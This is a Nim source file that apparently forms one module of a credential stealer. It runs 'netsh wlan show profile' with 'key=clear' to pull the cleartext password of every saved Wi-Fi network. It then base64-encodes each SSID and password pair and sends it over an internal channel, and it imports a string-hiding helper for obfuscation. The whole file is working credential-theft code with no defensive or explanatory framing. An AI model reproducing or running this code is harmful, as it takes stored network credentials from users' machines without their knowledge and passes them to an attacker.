## TODO: test on multiple environments

from strutils import split
from strutils import contains

from base64 import encode

import ../functions/runCmd

from ../channels import mainChannel

import ../functions/hideString

proc getWifiPasswords(): void =
  let netshOutout1: string = runCmd "netsh wlan show profile"

  for line in netshOutout1.split("\n"):
    let split: seq[string] = line.split(": ")

    if split.len == 2:
      let SSID: string = split[1]
      let netshOutout2: string = runCmd(
        "netsh wlan show profile \"" & SSID & "\" key=clear"
      )

      for line in netshOutout2.split("\n"):
        if line.contains("Key Content"):
          let password: string = line.split(": ")[1]
          mainChannel.send ("wp", encode SSID & ":" & password)

proc initWifiPasswordsThread*(): void {.thread.} =
  getWifiPasswords()
